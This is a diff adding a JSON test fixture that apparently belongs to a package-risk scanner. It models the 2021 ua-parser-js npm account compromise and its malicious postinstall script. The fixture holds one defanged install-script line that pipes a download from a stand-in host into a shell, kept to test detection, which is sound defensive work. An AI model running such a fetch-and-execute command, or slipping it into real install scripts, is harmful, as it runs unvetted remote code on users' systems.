@@ -1,0 +1,15 @@
+{
+  "_incident": "ua-parser-js account compromise (Oct 2021, CISA alert)",
+  "_disclosure": "https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js",
+  "_note": "An attacker compromised the maintainer's npm account (credential reuse) and published 3 malicious versions (0.7.29, 0.8.0, 1.0.0) with a postinstall script that ran a cryptominer and password-stealer depending on OS. ua-parser-js was an extremely mature, popular package (millions of weekly downloads). This proves install-script signal fires despite high maturity/adoption — maturity and install-scripts are independent findings; popularity does not suppress exfil detection. Payload defanged to an inert REDACTED marker; only the SHAPE (lifecycle script that fetches + pipes remote code) is preserved.",
+  "name": "ua-parser-js",
+  "version": "0.8.0",
+  "ageDays": 3650,
+  "weeklyDownloads": 10000000,
+  "hasInstallScripts": true,
+  "installScriptBodies": [
+    "curl https://REDACTED.example/payload.sh | sh"
+  ],
+  "maintainerCount": 1,
+  "deprecated": false
+}
